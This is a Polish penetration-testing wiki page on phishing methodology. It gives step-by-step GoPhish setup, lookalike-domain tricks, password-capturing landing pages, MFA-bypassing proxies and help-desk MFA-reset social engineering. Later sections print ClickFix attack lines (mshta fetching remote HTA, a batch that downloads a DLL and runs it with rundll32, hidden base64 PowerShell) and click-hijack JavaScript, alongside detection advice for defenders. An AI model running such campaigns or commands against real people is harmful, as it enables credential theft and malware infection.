# Metodologia phishing

{{#include ../../banners/hacktricks-training.md}}

## Metodologia

1. Rozpoznaj ofiarę
1. Wybierz **domenę ofiary**.
2. Wykonaj podstawową enumerację webową, **wyszukując portale logowania** używane przez ofiarę, i **zdecyduj**, który z nich będziesz **podszywać**.
3. Użyj **OSINT**, aby **znaleźć adresy e-mail**.
2. Przygotuj środowisko
1. **Kup domenę**, której zamierzasz użyć podczas testu phishingowego
2. **Skonfiguruj rekordy** związane z usługą pocztową (SPF, DMARC, DKIM, rDNS)
3. Skonfiguruj VPS z użyciem **gophish**
3. Przygotuj kampanię
1. Przygotuj **szablon wiadomości e-mail**
2. Przygotuj **stronę webową**, która będzie wykradać dane uwierzytelniające
4. Uruchom kampanię!

## Generowanie podobnych nazw domen lub zakup zaufanej domeny

### Techniki modyfikacji nazw domen

- **Keyword**: Nazwa domeny **zawiera** ważne **słowo kluczowe** z oryginalnej domeny (np. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Zmień **kropkę na łącznik** w subdomenie (np. www-zelster.com).
- **New TLD**: Ta sama domena z użyciem **nowego TLD** (np. zelster.org)
- **Homoglyph**: **Zastępuje** literę w nazwie domeny **literami, które wyglądają podobnie** (np. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Zamienia miejscami dwie litery** w nazwie domeny (np. zelsetr.com).
- **Singularization/Pluralization**: Dodaje lub usuwa „s” na końcu nazwy domeny (np. zeltsers.com).
- **Omission**: **Usuwa jedną** z liter nazwy domeny (np. zelser.com).
- **Repetition:** **Powtarza jedną** z liter w nazwie domeny (np. zeltsser.com).
- **Replacement**: Podobne do homoglyph, ale mniej skryte. Zastępuje jedną z liter w nazwie domeny, na przykład literą znajdującą się w pobliżu oryginalnej litery na klawiaturze (np. zektser.com).
- **Subdomained**: Wprowadza **kropkę** wewnątrz nazwy domeny (np. ze.lster.com).
- **Insertion**: **Wstawia literę** do nazwy domeny (np. zerltser.com).
- **Missing dot**: Dodaje TLD do nazwy domeny (np. zelstercom.com)

**Narzędzia automatyczne**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Strony webowe**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Istnieje **możliwość, że niektóre przechowywane lub przesyłane bity mogą zostać automatycznie odwrócone** z powodu różnych czynników, takich jak rozbłyski słoneczne, promieniowanie kosmiczne lub błędy sprzętowe.

Gdy koncepcja ta zostanie **zastosowana do żądań DNS**, możliwe jest, że **domena otrzymana przez serwer DNS** nie będzie taka sama jak domena pierwotnie zażądana.

Na przykład pojedyncza modyfikacja bitu w domenie „windows.com” może zmienić ją na „windnws.com”.

Atakujący mogą **wykorzystać to, rejestrując wiele domen bit-flippingowych**, które są podobne do domeny ofiary. Ich celem jest przekierowanie legalnych użytkowników do własnej infrastruktury.

Więcej informacji można znaleźć na stronie [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Kup zaufaną domenę

Możesz wyszukać na stronie [https://www.expireddomains.net/](https://www.expireddomains.net) wygasłą domenę, której można użyć.\
Aby upewnić się, że wygasła domena, którą zamierzasz kupić, **ma już dobre SEO**, możesz sprawdzić, jak jest kategoryzowana w:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Wyszukiwanie adresów e-mail

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (w 100% bezpłatne)
- [https://phonebook.cz/](https://phonebook.cz) (w 100% bezpłatne)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Aby **znaleźć więcej** prawidłowych adresów e-mail lub **zweryfikować te**, które zostały już znalezione, możesz sprawdzić, czy można przeprowadzić ich brute force na serwerach SMTP ofiary. [Dowiedz się tutaj, jak weryfikować/wyszukiwać adresy e-mail](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Ponadto pamiętaj, że jeśli użytkownicy korzystają z **dowolnego portalu webowego do uzyskiwania dostępu do poczty**, możesz sprawdzić, czy jest on podatny na **username brute force**, i wykorzystać tę podatność, jeśli to możliwe.

## Konfiguracja GoPhish

### Instalacja

Możesz pobrać go z [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Pobierz go, rozpakuj w `/opt/gophish` i wykonaj `/opt/gophish/gophish`\
W wyjściu otrzymasz hasło użytkownika administratora dla portu 3333. Uzyskaj więc dostęp do tego portu i użyj tych danych uwierzytelniających, aby zmienić hasło administratora. Może być konieczne przekierowanie tego portu lokalnie:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguracja

**Konfiguracja certyfikatu TLS**

Przed wykonaniem tego kroku musisz **już kupić domenę**, której zamierzasz używać, i musi ona **wskazywać** na **adres IP VPS-a**, na którym konfigurujesz **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Konfiguracja poczty**

Rozpocznij instalację: `apt-get install postfix`

Następnie dodaj domenę do następujących plików:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Zmień również wartości następujących zmiennych w pliku /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Na koniec zmodyfikuj pliki **`/etc/hostname`** i **`/etc/mailname`**, ustawiając w nich nazwę swojej domeny, a następnie **uruchom ponownie VPS.**

Teraz utwórz **rekord DNS A** dla `mail.<domain>`, wskazujący na **adres IP** VPS, oraz **rekord DNS MX** wskazujący na `mail.<domain>`

Teraz przetestujmy wysyłanie wiadomości e-mail:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Konfiguracja Gophish**

Zatrzymaj działanie Gophish i skonfiguruj je.\
Zmodyfikuj `/opt/gophish/config.json` w następujący sposób (zwróć uwagę na użycie https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Konfiguracja usługi gophish**

Aby utworzyć usługę gophish, tak aby można było ją automatycznie uruchamiać i zarządzać nią jako usługą, utwórz plik `/etc/init.d/gophish` z następującą zawartością:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Dokończ konfigurowanie usługi i sprawdź ją, wykonując:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigurowanie serwera pocztowego i domeny

### Poczekaj i zachowaj wiarygodność

Im starsza jest domena, tym mniejsze jest prawdopodobieństwo, że zostanie oznaczona jako spam. Dlatego przed rozpoczęciem phishing assessment należy odczekać jak najdłużej (co najmniej 1 tydzień). Ponadto, jeśli umieścisz stronę dotyczącą sektora cieszącego się dobrą reputacją, uzyskana reputacja będzie lepsza.

Pamiętaj, że nawet jeśli musisz odczekać tydzień, możesz już teraz zakończyć konfigurowanie wszystkiego.

### Skonfiguruj rekord Reverse DNS (rDNS)

Ustaw rekord rDNS (PTR), który rozwiązuje adres IP VPS do nazwy domeny.

### Rekord Sender Policy Framework (SPF)

Musisz **skonfigurować rekord SPF dla nowej domeny**. Jeśli nie wiesz, czym jest rekord SPF, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Możesz użyć [https://www.spfwizard.net/](https://www.spfwizard.net), aby wygenerować swoją politykę SPF (użyj adresu IP serwera VPS).

![Formularz SPF Wizard do generowania rekordu SPF dla domeny phishingowej](<../../images/image (1037).png>)

To jest zawartość, którą należy ustawić w rekordzie TXT w domenie:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Rekord Domain-based Message Authentication, Reporting & Conformance (DMARC)

Musisz **skonfigurować rekord DMARC dla nowej domeny**. Jeśli nie wiesz, czym jest rekord DMARC, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Musisz utworzyć nowy rekord DNS TXT wskazujący hostname `_dmarc.<domain>` z następującą zawartością:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Musisz **skonfigurować DKIM dla nowej domeny**. Jeśli nie wiesz, czym jest rekord DKIM, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Ten tutorial jest oparty na: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Musisz połączyć obie wartości B64 generowane przez klucz DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Sprawdź wynik konfiguracji poczty e-mail

Możesz to zrobić za pomocą [https://www.mail-tester.com/](https://www.mail-tester.com)\
Po prostu otwórz stronę i wyślij wiadomość e-mail na podany przez nich adres:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Możesz również **sprawdzić konfigurację poczty e-mail**, wysyłając wiadomość na adres `check-auth@verifier.port25.com` i **odczytując odpowiedź** (w tym celu musisz **otworzyć** port **25** i sprawdzić odpowiedź w pliku _/var/mail/root_, jeśli wyślesz wiadomość jako root).\
Sprawdź, czy przechodzisz wszystkie testy:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Możesz również wysłać **wiadomość do Gmaila znajdującego się pod Twoją kontrolą** i sprawdzić **nagłówki wiadomości** w swojej skrzynce odbiorczej Gmaila — `dkim=pass` powinno znajdować się w polu nagłówka `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Usuwanie z czarnej listy Spamhaus

Strona [www.mail-tester.com](https://www.mail-tester.com) może wskazać, czy Twoja domena jest blokowana przez Spamhaus. Możesz poprosić o usunięcie swojej domeny/IP pod adresem: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Usuwanie z czarnej listy Microsoft

​​Możesz poprosić o usunięcie swojej domeny/IP pod adresem [https://sender.office.com/](https://sender.office.com).

## Tworzenie i uruchamianie kampanii GoPhish

### Sending Profile

- Ustaw **nazwę umożliwiającą identyfikację** profilu nadawcy
- Zdecyduj, z którego konta będziesz wysyłać phishingowe wiadomości e-mail. Sugestie: _noreply, support, servicedesk, salesforce..._
- Możesz pozostawić nazwę użytkownika i hasło puste, ale upewnij się, że zaznaczono Ignore Certificate Errors

![Tworzenie i uruchamianie kampanii GoPhish - Sending Profile: Możesz pozostawić nazwę użytkownika i hasło puste, ale upewnij się, że zaznaczono Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Zaleca się użycie funkcji "**Send Test Email**", aby sprawdzić, czy wszystko działa.\
> Zalecam **wysyłanie testowych wiadomości e-mail na adresy 10min mails**, aby uniknąć znalezienia się na czarnej liście podczas przeprowadzania testów.

### Email Template

- Ustaw **nazwę umożliwiającą identyfikację** szablonu
- Następnie wpisz **temat** (nic dziwnego, po prostu coś, czego można się spodziewać w zwykłej wiadomości e-mail)
- Upewnij się, że zaznaczono "**Add Tracking Image**"
- Napisz **szablon wiadomości e-mail** (możesz używać zmiennych, jak w poniższym przykładzie):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Zauważ, że **w celu zwiększenia wiarygodności wiadomości e-mail** zaleca się użycie jakiegoś podpisu z wiadomości e-mail od klienta. Sugestie:

- Wyślij wiadomość e-mail na **nieistniejący adres** i sprawdź, czy odpowiedź zawiera podpis.
- Wyszukaj **publiczne adresy e-mail**, takie jak info@ex.com, press@ex.com lub public@ex.com, wyślij na nie wiadomość e-mail i zaczekaj na odpowiedź.
- Spróbuj skontaktować się z **jakimś poprawnym, znalezionym** adresem e-mail i zaczekaj na odpowiedź.

![Sending Profile - Email Template: Spróbuj skontaktować się z jakimś poprawnym, znalezionym adresem e-mail i zaczekaj na odpowiedź](<../../images/image (80).png>)

> [!TIP]
> Email Template pozwala również **dołączać pliki do wysłania**. Jeśli chcesz także kraść wyzwania NTLM za pomocą specjalnie spreparowanych plików/dokumentów, [przeczytaj tę stronę](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Ustaw **nazwę**
- **Wpisz kod HTML** strony internetowej. Zauważ, że możesz **importować** strony internetowe.
- Zaznacz **Capture Submitted Data** i **Capture Passwords**
- Ustaw **przekierowanie**

![Email Template - Landing Page: Zaznacz Capture Submitted Data i Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Zwykle konieczna będzie modyfikacja kodu HTML strony i wykonanie kilku testów lokalnie (być może przy użyciu serwera Apache) **aż do uzyskania oczekiwanych rezultatów.** Następnie wpisz ten kod HTML w polu.\
> Zauważ, że jeśli potrzebujesz **użyć zasobów statycznych** dla HTML (być może stron CSS i JS), możesz zapisać je w _**/opt/gophish/static/endpoint**_, a następnie uzyskać do nich dostęp z poziomu _**/static/\<filename>**_

> [!TIP]
> W przypadku przekierowania możesz **przekierować użytkowników do legalnej głównej strony internetowej** ofiary albo na przykład przekierować ich do _/static/migration.html_, umieścić tam **obracające się kółko (**[**https://loading.io/**](https://loading.io)**) na 5 sekund, a następnie wyświetlić informację, że proces zakończył się powodzeniem**.

### Users & Groups

- Ustaw nazwę
- **Zaimportuj dane** (zauważ, że aby użyć template w tym przykładzie, potrzebujesz imienia, nazwiska i adresu e-mail każdego użytkownika)

![Landing Page - Users & Groups: Zaimportuj dane (zauważ, że aby użyć template w tym przykładzie, potrzebujesz imienia, nazwiska i adresu e-mail każdego użytkownika)](<../../images/image (163).png>)

### Campaign

Na koniec utwórz kampanię, wybierając nazwę, Email Template, Landing Page, URL, sending profile i grupę. Zauważ, że URL będzie linkiem wysyłanym ofiarom.

Zauważ, że **Sending Profile umożliwia wysłanie testowej wiadomości e-mail, aby sprawdzić, jak będzie wyglądać końcowa wiadomość phishingowa**:

![Users & Groups - Campaign: Zauważ, że Sending Profile umożliwia wysłanie testowej wiadomości e-mail, aby sprawdzić, jak będzie wyglądać końcowa wiadomość phishingowa](<../../images/image (192).png>)

Gdy wszystko będzie gotowe, po prostu uruchom kampanię!

## Klonowanie strony internetowej

Jeśli z jakiegokolwiek powodu chcesz sklonować stronę internetową, sprawdź następującą stronę:


{{#ref}}
clone-a-website.md
{{#endref}}

## Dokumenty i pliki z backdoorem

W ramach niektórych ocen phishingowych (głównie dla Red Teams) możesz również chcieć **wysyłać pliki zawierające jakiś rodzaj backdoora** (być może C2 albo po prostu coś, co wywoła uwierzytelnianie).\
Sprawdź poniższą stronę, aby znaleźć przykłady:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Przez proxy MitM

Poprzedni atak jest dość sprytny, ponieważ podszywasz się pod prawdziwą stronę internetową i zbierasz informacje wprowadzone przez użytkownika. Niestety, jeśli użytkownik nie wprowadził poprawnego hasła albo jeśli aplikacja, pod którą się podszywasz, jest skonfigurowana z 2FA, **informacje te nie pozwolą ci podszyć się pod oszukanego użytkownika**.

W tym miejscu przydatne są narzędzia takie jak [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) i [**muraena**](https://github.com/muraenateam/muraena). To narzędzie pozwoli ci przeprowadzić atak przypominający MitM. Zasadniczo atak działa w następujący sposób:

1. **Podszywasz się pod formularz logowania** prawdziwej strony internetowej.
2. Użytkownik **wysyła** swoje **dane uwierzytelniające** na twoją fałszywą stronę, a narzędzie wysyła je na prawdziwą stronę, **sprawdzając, czy dane uwierzytelniające działają**.
3. Jeśli konto jest skonfigurowane z **2FA**, strona MitM poprosi o jego podanie, a gdy **użytkownik je wprowadzi**, narzędzie wyśle je na prawdziwą stronę internetową.
4. Po uwierzytelnieniu użytkownika ty (jako atakujący) będziesz mieć **przechwycone dane uwierzytelniające, 2FA, cookie i wszelkie informacje** z każdej interakcji użytkownika podczas działania narzędzia jako MitM.

### Przez VNC

Co jeśli zamiast **wysyłać ofiarę na złośliwą stronę** wyglądającą tak samo jak oryginalna, wyślesz ją do **sesji VNC z przeglądarką połączoną z prawdziwą stroną internetową**? Będziesz w stanie obserwować jej działania, wykraść hasło, użyte MFA, cookie...\
Możesz to zrobić za pomocą [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Wykrywanie wykrycia

Oczywiście jednym z najlepszych sposobów sprawdzenia, czy zostałeś wykryty, jest **wyszukanie swojej domeny na blacklistach**. Jeśli pojawi się na liście, oznacza to, że twoja domena została w jakiś sposób wykryta jako podejrzana.\
Jednym z łatwych sposobów sprawdzenia, czy twoja domena znajduje się na którejś blackliście, jest użycie [https://malwareworld.com/](https://malwareworld.com)

Istnieją jednak inne sposoby sprawdzenia, czy ofiara **aktywnie wyszukuje podejrzanej aktywności phishingowej w sieci**, jak wyjaśniono tutaj:


{{#ref}}
detecting-phising.md
{{#endref}}

Możesz **kupić domenę o bardzo podobnej nazwie** do domeny ofiary **i/lub wygenerować certyfikat** dla **subdomeny** kontrolowanej przez ciebie domeny, **zawierającej** **słowo kluczowe** z domeny ofiary. Jeśli **ofiara** wykona z nią jakąkolwiek **interakcję DNS lub HTTP**, będziesz wiedzieć, że **aktywnie wyszukuje** podejrzanych domen i musisz zachować szczególną ostrożność.<sup>[[2]](#references)</sup>

### Ocena phishingu

Użyj [**Phishious** ](https://github.com/Rices/Phishious), aby ocenić, czy twoja wiadomość e-mail trafi do folderu spamu, zostanie zablokowana, czy zakończy się powodzeniem.

## Kompromitacja tożsamości z bezpośrednim kontaktem (reset MFA przez help-desk)

Współczesne zestawy intruzyjne coraz częściej całkowicie pomijają przynęty e-mailowe i **bezpośrednio atakują proces obsługi zgłoszeń / odzyskiwania tożsamości**, aby obejść MFA. Atak w całości opiera się na technice "living-off-the-land": gdy operator przejmie prawidłowe dane uwierzytelniające, porusza się dalej za pomocą wbudowanych narzędzi administracyjnych – nie jest wymagane żadne malware.<sup>[[6]](#references)</sup>

### Przebieg ataku
1. Rozpoznanie ofiary
* Zbieranie danych osobowych i firmowych z LinkedIn, wycieków danych, publicznego GitHub itd.
* Identyfikacja tożsamości o wysokiej wartości (kadra kierownicza, IT, finanse) i ustalenie **dokładnego procesu help-desk** dotyczącego resetowania hasła / MFA.
2. Inżynieria społeczna w czasie rzeczywistym
* Telefon, kontakt przez Teams lub czat z help-deskiem z podszywaniem się pod cel (często przy użyciu **sfałszowanego identyfikatora dzwoniącego** lub **sklonowanego głosu**).
* Przekazanie wcześniej zebranych danych PII w celu przejścia weryfikacji opartej na wiedzy.
* Przekonanie pracownika do **zresetowania sekretu MFA** lub wykonania **SIM-swap** dla zarejestrowanego numeru telefonu.
3. Natychmiastowe działania po uzyskaniu dostępu (≤60 min w rzeczywistych przypadkach)
* Uzyskanie przyczółka przez dowolny portal web SSO.
* Wyliczenie AD / AzureAD za pomocą wbudowanych narzędzi (bez upuszczania plików binarnych):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Ruch boczny za pomocą **WMI**, **PsExec** lub legalnych agentów **RMM**, które są już dozwolone w środowisku.

### Wykrywanie i ograniczanie ryzyka
* Traktuj odzyskiwanie tożsamości przez help-desk jako **operację uprzywilejowaną** – wymagaj step-up auth i akceptacji przełożonego.
* Wdróż reguły **Identity Threat Detection & Response (ITDR)** / **UEBA**, które generują alerty dotyczące:
* Zmiany metody MFA + uwierzytelnienia z nowego urządzenia / lokalizacji geograficznej.
* Natychmiastowego podniesienia uprawnień tego samego principal (user-→-admin).
* Nagrywaj rozmowy z help-deskiem i wymagaj **oddzwonienia na wcześniej zarejestrowany numer** przed wykonaniem jakiegokolwiek resetu.
* Zaimplementuj **Just-In-Time (JIT) / Privileged Access**, aby świeżo zresetowane konta **nie dziedziczyły automatycznie tokenów o wysokich uprawnieniach**.

---

## Oszustwa na dużą skalę – zatruwanie SEO i kampanie „ClickFix”
Grupy wykorzystujące commodity ograniczają koszty operacji wymagających bezpośredniego kontaktu za pomocą masowych ataków, które zmieniają **wyszukiwarki i sieci reklamowe w kanał dostarczania**.<sup>[[6]](#references)</sup>

1. **Zatruwanie SEO / malvertising** wypycha fałszywy wynik, taki jak `chromium-update[.]site`, na szczyt reklam w wynikach wyszukiwania.
2. Ofiara pobiera niewielki **loader pierwszego etapu** (często JS/HTA/ISO). Przykłady zaobserwowane przez Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader eksfiltruje cookie przeglądarki i bazy danych danych uwierzytelniających, a następnie pobiera **cichy loader**, który w czasie rzeczywistym decyduje, czy wdrożyć:
* RAT (np. AsyncRAT, RustDesk)
* ransomware / wiper
* komponent persistence (klucz Run w rejestrze + zaplanowane zadanie)

### Wskazówki dotyczące hardeningu
* Blokuj nowo zarejestrowane domeny i wymuszaj **Advanced DNS / URL Filtering** również dla *search-ads*, a nie tylko dla poczty e-mail.
* Ogranicz instalowanie oprogramowania do podpisanych pakietów MSI / Store, a wykonywanie `HTA`, `ISO`, `VBS` blokuj za pomocą zasad.
* Monitoruj procesy potomne przeglądarek otwierające instalatory:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Wyszukuj LOLBins często nadużywane przez loadery pierwszego etapu (np. `regsvr32`, `curl`, `mshta`).

### Przejęcie kliknięcia przycisku pobierania z przekazaniem do TDS
Niektóre fałszywe portale z oprogramowaniem pozostawiają widoczny atrybut download `href` wskazujący na **prawdziwy URL GitHub/release**, ale za pomocą JavaScript przejmują **pierwszą** interakcję użytkownika i zamiast tego przekierowują ofiarę do łańcucha **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Najważniejsze cechy:
- Hook zwykle uruchamia się w **capture phase** (`true`) na obiekcie `document`, więc działa przed handlerami witryny.
- Chrome często używa `mousedown` zamiast `click`, aby utrzymać przekierowanie powiązane z prawidłowym **user gesture** i zwiększyć skuteczność omijania blokad popupów.
- Niektóre warianty wcześniej otwierają `about:blank` lub symulują kliknięcia `<a target="_blank">`, a dopiero później przypisują adres URL TDS.
- Limity po stronie przeglądarki często znajdują się w `localStorage`, więc **pierwsze kliknięcie** może prowadzić do malware, a odświeżenia/próby ponowienia mogą kierować z powrotem do wyglądającego niewinnie widocznego linku.
- TDS może filtrować na podstawie referrera, domeny wejściowej, GEO, fingerprintu przeglądarki/urządzenia, kontroli VPN/datacenter, kontekstu kliknięcia i liczników dla sesji, przez co powtórki analityków są niedeterministyczne.

Pomysły dla obrońców:
- Porównuj wyświetlany `href` z rzeczywistym celem nawigacji generowanym w momencie kliknięcia.
- Wyszukuj handlery `document.addEventListener(..., true)`, które wywołują jednocześnie `preventDefault()` i `stopImmediatePropagation()` w pobliżu `window.open`, `about:blank` lub symulowanych kliknięć anchorów.
- Traktuj klastry nowo zarejestrowanych domen z oprogramowaniem do pobrania, które wszystkie ładują ten sam etap CloudFront/JS, jako silny sygnał wzorca SEO poisoning/TDS.

### ClickFix z fałszywych stron weryfikacyjnych + pobieranie LOLBAS wyglądające jak archiwum
Niektóre gałęzie TDS kończą się na fałszywej stronie weryfikacyjnej (w stylu Cloudflare/IUAM), która nakazuje ofierze uruchomić zaufany plik binarny Windows, taki jak:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Uwagi:
- `mshta.exe` wykonuje **HTA/VBScript znajdujący się na początku odpowiedzi**, nawet jeśli URL sugeruje, że chodzi o archiwum `.7z`; dołączone dane archiwum mogą być wyłącznie przynętą.
- Kolejne etapy często nadal wprowadzają w błąd co do typu pliku (`.rtf` dla PowerShell, `.asar` dla Python, ZIP-y z dopełnionymi binariami), a następnie przełączają się na **ręczne mapowanie PE / wykonywanie w pamięci**.
- Jeśli reagujesz na jeden z tych łańcuchów, zachowaj **sieć + pamięć od pierwszego udanego uruchomienia**: późniejsze powtórzenia mogą pokazywać tylko nieszkodliwą ścieżkę instalatora/SFX albo kończyć się niepowodzeniem, ponieważ wydanie payloadu/klucza było powiązane z pierwotną sesją TDS.

### Taktyka dostarczania DLL przez ClickFix (fałszywa aktualizacja CERT)
* Przynęta: sklonowany komunikat krajowego CERT z przyciskiem **Update**, który wyświetla instrukcje „naprawy” krok po kroku. Ofiary są instruowane, aby uruchomić batch, który pobiera DLL i wykonuje ją za pomocą `rundll32`.<sup>[[12]](#references)</sup>
* Zaobserwowany typowy łańcuch batch:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` zapisuje payload w `%TEMP%`, krótkie opóźnienie ukrywa opóźnienia sieciowe, a następnie `rundll32` wywołuje eksportowany entrypoint (`notepad`).
* DLL wysyła informacje o tożsamości hosta i odpytuje C2 co kilka minut. Zdalne zadania są dostarczane jako **zakodowany w base64 PowerShell**, wykonywany w ukryciu i z obejściem zasad:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
